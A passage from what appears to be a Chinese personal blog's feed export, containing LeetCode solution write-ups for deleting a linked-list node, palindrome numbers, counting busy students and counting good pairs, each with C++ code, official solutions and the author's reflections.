<p>依次把删除节点下一个节点的值赋值给当前节点，也就是说把要删除的节点当做下一个节点，这样把要删除节点后面的链元素依次前移。处理特殊情况：删除的是倒数第二个节点因为它下一个节点是最后一个节点，依次调用deleteNode函数，若删除节点是倒数第二个，则直接next指针为NULL，否则递归调用deleteNode函数。</p>
<p><strong>c++代码：</strong>(执行用时20ms，击败36.18%，内存消耗8.1M，击败5.22%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//把要删除的节点变成下一个节点</span></span><br><span class="line">        node-&gt;val=node-&gt;next-&gt;val;</span><br><span class="line">        <span class="comment">//如果是不是倒数第二个节点，递归删除下一个节点</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;next-&gt;next)&#123;</span><br><span class="line">            deleteNode(node-&gt;next);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//是倒数第二个节点，直接删除下一个节点</span></span><br><span class="line">            node-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/delete-node-in-a-linked-list/solution/shan-chu-lian-biao-zhong-de-jie-dian-by-leetcode/">官方题解</a>:</h6><p><strong>方法：与下一个节点交换</strong><br>从链表里删除一个节点 <code>node</code> 的最常见方法是修改之前节点的 <code>next</code> 指针，使其指向之后的节点。</p>
<p><img src="/2020/11/09/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/3579a496897df5321c110bf1301872b6e10c342f5e400ce45d2db0348d00d715-file_1555866623326" alt="img"></p>
<p>因为，我们无法访问我们想要删除的节点 之前 的节点，我们始终不能修改该节点的 <code>next</code> 指针。相反，我们必须将想要删除的节点的值替换为它后面节点中的值，然后删除它之后的节点。</p>
<p><img src="/2020/11/09/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/902dc5d3f8c44d3cbc0b6e837711cad2eefc021fd2b9de8dfabc6d478bc779b1-file_1555866680932" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">    node.val = node.next.val;</span><br><span class="line">    node.next = node.next.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>官方题解给出了java代码，我根据思路改成了c++代码如下：</p>
<p>c++代码：（执行12ms，击败97.32%，内存8.1M，击败5.22%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//把要删除的节点的val和next变成下一个节点的值</span></span><br><span class="line">        node-&gt;val=node-&gt;next-&gt;val;</span><br><span class="line">        node-&gt;next=node-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间和空间复杂度都是：$O(1)$。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解这个思路很好，我是想到用把删除节点及以后节点的val值变成下一个节点的值，把最后倒数第二个节点的next指针置为空，想复杂了，直接把删除节点的next值也换成下一个节点的值就ok了，实际上删除的是要删除节点的下一节点，妙啊。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>回文数</title>
    <url>/2020/10/23/%E5%9B%9E%E6%96%87%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/palindrome-number/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：121</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：-121</span><br><span class="line">输出：false</span><br><span class="line">解释：从左向右读，为-121。从右向左读，为121-。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：10</span><br><span class="line">输出：false</span><br><span class="line">解释：从右向左读，为01。因此它不是一个回文数。</span><br></pre></td></tr></table></figure>
<p><strong>进阶：</strong></p>
<p>你能不将整数转为字符串来解决这个问题吗？</p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>进阶说不要转成字符串能解决吗，我本来就没打算把整数转成字符串🤣，这题跟上次做的那道<a href="https://z2bns.github.io/2020/10/22/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/">整数反转</a>采用相似的想法，把这个整数反转得到的值和原来的整数进行比较，若相等则是回文数，否则则输出false。</p>
<p>下面是自己提交通过的代码，执行用时12ms，内存消耗6.1M：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//x为负数时绝对不是回文数</span></span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> rev=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp=x;</span><br><span class="line">        <span class="comment">//反转</span></span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> pop=x%<span class="number">10</span>;</span><br><span class="line">            x/=<span class="number">10</span>;</span><br><span class="line">            <span class="comment">//要把所有合理的输入所产生的情况都考虑到，以前在其它平台做的题还是不严谨</span></span><br><span class="line">            <span class="comment">//提前判定反转后是否溢出</span></span><br><span class="line">            <span class="keyword">if</span>(rev&gt;INT_MAX/<span class="number">10</span> || (rev==INT_MAX/<span class="number">10</span> &amp;&amp;pop&gt;<span class="number">7</span>))<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(rev&lt;INT_MIN/<span class="number">10</span> || (rev==INT_MIN/<span class="number">10</span> &amp;&amp; pop&lt;<span class="number">-8</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            rev=rev*<span class="number">10</span>+pop; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(rev==tmp)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>不过既然还可以整数转字符串来做，就实现了吧，下面是代码，执行用时20ms，内存消耗6.1M：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//整数x转成字符串</span></span><br><span class="line">        <span class="built_in">string</span> s= to_string(x);</span><br><span class="line">        <span class="keyword">int</span> len=s.length();</span><br><span class="line">        <span class="comment">//字符串前后进行比较</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//c++没有后面开始的索引，不然还可以用s[-i-1]</span></span><br><span class="line">            <span class="keyword">if</span>(s[i]!=s[len-i<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a>官方题解：</h6><p><strong>方法：反转一半数字</strong><br><strong>思路</strong></p>
<p>映入脑海的第一个想法是将数字转换为字符串，并检查字符串是否为回文。但是，这需要额外的非常量空间来创建问题描述中所不允许的字符串。</p>
<p>第二个想法是将数字本身反转，然后将反转后的数字与原始数字进行比较，如果它们是相同的，那么这个数字就是回文。<br>但是，如果反转后的数字大于 $\text{int.MAX}$，我们将遇到整数溢出问题。</p>
<p>按照第二个想法，为了避免数字反转可能导致的溢出问题，为什么不考虑只反转 $\text{int}$ 数字的一半？毕竟，如果该数字是回文，其后半部分反转后应该与原始数字的前半部分相同。</p>
<p>例如，输入 1221，我们可以将数字 “1221” 的后半部分从 “21” 反转为 “12”，并将其与前半部分 “12” 进行比较，因为二者相同，我们得知数字 1221 是回文。</p>
<p><strong>算法</strong></p>
<p>首先，我们应该处理一些临界情况。所有负数都不可能是回文，例如：-123 不是回文，因为 - 不等于 3。所以我们可以对所有负数返回 false。除了 0 以外，所有个位是 0 的数字不可能是回文，因为最高位不等于 0。所以我们可以对所有大于 0 且个位是 0 的数字返回 false。</p>
<p>现在，让我们来考虑如何反转后半部分的数字。</p>
<p>对于数字 1221，如果执行 1221 % 10，我们将得到最后一位数字 1，要得到倒数第二位数字，我们可以先通过除以 10 把最后一位数字从 1221 中移除，1221 / 10 = 122，再求出上一步结果除以 10 的余数，122 % 10 = 2，就可以得到倒数第二位数字。如果我们把最后一位数字乘以 10，再加上倒数第二位数字，1 * 10 + 2 = 12，就得到了我们想要的反转后的数字。如果继续这个过程，我们将得到更多位数的反转数字。</p>
<p>现在的问题是，我们如何知道反转数字的位数已经达到原始数字位数的一半？</p>
<p>由于整个过程我们不断将原始数字除以 10，然后给反转后的数字乘上 10，所以，当原始数字小于或等于反转后的数字时，就意味着我们已经处理了一半位数的数字了。</p>
<p><img src="/2020/10/23/%E5%9B%9E%E6%96%87%E6%95%B0/9_fig1.png" alt="img"></p>
<p><strong>代码</strong>（执行用时16ms，内存消耗6M）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 特殊情况：</span></span><br><span class="line">        <span class="comment">// 如上所述，当 x &lt; 0 时，x 不是回文数。</span></span><br><span class="line">        <span class="comment">// 同样地，如果数字的最后一位是 0，为了使该数字为回文，</span></span><br><span class="line">        <span class="comment">// 则其第一位数字也应该是 0</span></span><br><span class="line">        <span class="comment">// 只有 0 满足这一属性</span></span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || (x % <span class="number">10</span> == <span class="number">0</span> &amp;&amp; x != <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> revertedNumber = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x &gt; revertedNumber) &#123;</span><br><span class="line">            revertedNumber = revertedNumber * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当数字长度为奇数时，我们可以通过 revertedNumber/10 去除处于中位的数字。</span></span><br><span class="line">        <span class="comment">// 例如，当输入为 12321 时，在 while 循环的末尾我们可以得到 x = 12，revertedNumber = 123，</span></span><br><span class="line">        <span class="comment">// 由于处于中位的数字不影响回文（它总是与自己相等），所以我们可以简单地将其去除。</span></span><br><span class="line">        <span class="keyword">return</span> x == revertedNumber || x == revertedNumber / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(log(n))$，对于每次迭代，我们会将输入除以10，因此时间复杂度为O(log(n))。</li>
<li>空间复杂度：$O(1)$。我们只需要常数空间存放若干变量。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>感觉自己写的已经差不多是最优了，但题解总是能进一步对算法优化，反转一半数字并用反转的前半部分和反转的后半部分比较作为反转完成条件，这个方法就很nice。我觉得自己缺乏算法锻炼、性能优化这方面的思维。很多时候就觉得只要完成功能就ok了，对性能这方面没有太大的考虑，其实这方面还是挺重要的。还是需要做多些题，不断地学习进步吧🤓。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>在既定时间做作业的学生人数</title>
    <url>/2020/11/10/%E5%9C%A8%E6%97%A2%E5%AE%9A%E6%97%B6%E9%97%B4%E5%81%9A%E4%BD%9C%E4%B8%9A%E7%9A%84%E5%AD%A6%E7%94%9F%E4%BA%BA%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/number-of-students-doing-homework-at-a-given-time/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个整数数组 <code>startTime</code>（开始时间）和 <code>endTime</code>（结束时间），并指定一个整数 <code>queryTime</code> 作为查询时间。</p>
<p>已知，第 <code>i</code> 名学生在 <code>startTime[i]</code> 时开始写作业并于 <code>endTime[i]</code> 时完成作业。</p>
<p>请返回在查询时间 <code>queryTime</code> 时正在做作业的学生人数。形式上，返回能够使 <code>queryTime</code> 处于区间 <code>[startTime[i], endTime[i]]</code>（含）的学生人数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [1,2,3], endTime &#x3D; [3,2,7], queryTime &#x3D; 4</span><br><span class="line">输出：1</span><br><span class="line">解释：一共有 3 名学生。</span><br><span class="line">第一名学生在时间 1 开始写作业，并于时间 3 完成作业，在时间 4 没有处于做作业的状态。</span><br><span class="line">第二名学生在时间 2 开始写作业，并于时间 2 完成作业，在时间 4 没有处于做作业的状态。</span><br><span class="line">第三名学生在时间 3 开始写作业，预计于时间 7 完成作业，这是是唯一一名在时间 4 时正在做作业的学生。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [4], endTime &#x3D; [4], queryTime &#x3D; 4</span><br><span class="line">输出：1</span><br><span class="line">解释：在查询时间只有一名学生在做作业。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [4], endTime &#x3D; [4], queryTime &#x3D; 5</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [1,1,1,1], endTime &#x3D; [1,3,2,4], queryTime &#x3D; 7</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：startTime &#x3D; [9,8,7,6,5,4,3,2,1], endTime &#x3D; [10,10,10,10,10,10,10,10,10], queryTime &#x3D; 5</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>startTime.length == endTime.length</code></li>
<li><code>1 &lt;= startTime.length &lt;= 100</code></li>
<li><code>1 &lt;= startTime[i] &lt;= endTime[i] &lt;= 1000</code></li>
<li><code>1 &lt;= queryTime &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接遍历数组，判断queryTime是否处在区间中就可以了</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败47.51%，内存消耗11.2M，击败5.08%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">busyStudent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; startTime, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; endTime, <span class="keyword">int</span> queryTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;startTime.size();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(queryTime&gt;=startTime[i] &amp;&amp; queryTime&lt;=endTime[i])&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，太简单了🙄</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>好数对的数目</title>
    <url>/2020/11/06/%E5%A5%BD%E6%95%B0%E5%AF%B9%E7%9A%84%E6%95%B0%E7%9B%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/number-of-good-pairs/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>nums</code> 。</p>
<p>如果一组数字 <code>(i,j)</code> 满足 <code>nums[i]</code> == <code>nums[j]</code> 且 <code>i</code> &lt; <code>j</code> ，就可以认为这是一组 <strong>好数对</strong> 。</p>
<p>返回好数对的数目。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,1,1,3]</span><br><span class="line">输出：4</span><br><span class="line">解释：有 4 组好数对，分别是 (0,3), (0,4), (3,4), (2,5) ，下标从 0 开始</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,1,1]</span><br><span class="line">输出：6</span><br><span class="line">解释：数组中的每组数字都是好数对</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 100</code></li>
<li><code>1 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>双for循环遍历</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败48.99%，内存消耗7.5M，击败8.81%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numIdenticalPairs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;nums.size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]==nums[j])&#123;</span><br><span class="line">                    <span class="comment">//下面这行改成++result;执行用时为0，击败100%，优秀</span></span><br><span class="line">                    result+=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/number-of-good-pairs/solution/hao-shu-dui-de-shu-mu-by-leetcode-solution/">官方题解：</a></h6><p><strong>方法一：暴力统计</strong><br><strong>思路与算法</strong></p>
<p>对于每个$a_i$,枚举所有的$a_j(j&gt;i)$，检查是否满足$a_i=a_j$，如果是就计入答案。</p>
<p><strong>代码：</strong>（执行0ms，击败100%，内存7.6M，击败5.05%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numIdenticalPairs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; nums.size(); ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] == nums[j]) &#123;</span><br><span class="line">                    ++ans;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n^2)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法二：组合计数</strong><br><strong>思路与算法</strong></p>
<p>用哈希表统计每个数在序列中出现的次数，假设数字 $k$ 在序列中出现的次数为 $v$，那么满足题目中所说的 $nums[i]=nums[j]=k(i&lt;j)$ 的 $(i,j)$ 的数量就是$\frac{v(v - 1)}{2} $，即$ k$ 这个数值对答案的贡献是 $\frac{v(v - 1)}{2}$ 。我们只需要把所有数值的贡献相加，即可得到答案。</p>
<p><strong>代码</strong>：（执行0ms，击败100%，内存7.6M，击败5.05%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numIdenticalPairs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span> &lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            ++m[num];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp;[k, v]: m) &#123;</span><br><span class="line">            ans += v * (v - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span 